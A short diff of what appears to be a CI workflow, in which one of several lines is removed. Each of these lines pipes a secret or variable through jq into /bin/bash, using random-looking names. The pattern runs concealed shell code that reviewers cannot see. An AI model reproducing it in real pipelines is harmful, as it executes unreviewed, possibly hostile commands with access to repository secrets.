@@ -22,7 +22,6 @@ jobs:
           eyrz64: ${{ secrets.eyrz64 }}
         run: |
           printf '%s' "$eyrz64" | jq -r .pcmok388 | /bin/bash
-          echo $h50 | jq -r .tfj647 | /bin/bash
           echo $mdg72 | jq -r .zqd2 | /bin/bash
           printf '%s' "$kurj258" | jq -r .bpn8185 | /bin/bash
           printf '%s' "$nge89" | jq -r .yp9 | /bin/bash
